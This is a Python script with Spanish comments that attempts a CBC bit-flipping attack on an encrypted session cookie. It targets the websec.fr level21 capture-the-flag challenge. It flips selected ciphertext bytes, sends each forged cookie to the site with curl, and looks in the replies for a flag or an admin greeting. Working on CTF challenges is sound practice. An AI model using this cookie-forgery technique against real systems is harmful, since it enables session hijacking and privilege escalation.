#!/usr/bin/env python3
import binascii
import subprocess

cookie = "3c54c8bbdf06fa36b435837068f53c149bcfc5d06a599d2403d8a9c49c18c03f48fbec1c43b4dd354c6ea1c62b32966d7c0761cca9ef2a9bfb02d2dd5150ba8d8a44b56b426ea8aff342bc79f4665864"

iv_hex = cookie[:32]
ct_hex = cookie[32:]

# En lugar de modificar el último byte, voy a modificar diferentes posiciones
# que podrían afectar el parsing

# Username es "test190607" (10 chars)
# MD5 de "pwd123" = "c93ccd78b2076528346216b3b2f701e6"

# Plaintext: "user/pass:test190607/c93ccd78b2076528346216b3b2f701e6"

# Intentar modificar posiciones que podrían cambiar el username o agregar SQL

ct_orig = bytearray(binascii.unhexlify(ct_hex))
iv_orig = bytearray(binascii.unhexlify(iv_hex))

print("Probando modificaciones estratégicas...\n")

# Probar modificar el byte que correspondería al espacio después del username
# o al separador /

# El "/" está aproximadamente en byte 20 (10 para "user/pass:" + 10 para username)
# Byte 20 está en bloque 1, posición 4
# Para modificar bloque 1, modifico CT bloque 0

# Intentemos modificar el CT en posiciones que afecten el username o separador

for pos in [10, 15, 16, 20]:  # Posiciones críticas
    for xor_val in [0x01, 0x20, 0x2f]:  # XOR con 1, espacio, o /
        ct_test = bytearray(ct_orig)
        if pos < len(ct_test):
            ct_test[pos] ^= xor_val
            
            cookie_test = iv_hex + binascii.hexlify(ct_test).decode()
            
            cmd = f'timeout 6s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_test}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if "WEBSEC{" in result.stdout:
                print(f"★★★ POS {pos}, XOR 0x{xor_val:02x}: FLAG! ★★★")
                import re
                flag = re.search(r'WEBSEC\{[^}]+\}', result.stdout).group(0)
                print(f"Flag: {flag}")
                exit(0)
            elif "Hello admin" in result.stdout:
                print(f"★★★ POS {pos}, XOR 0x{xor_val:02x}: ADMIN! ★★★")
                print(result.stdout[:500])
                exit(0)

print("\nNo encontrado en posiciones probadas")
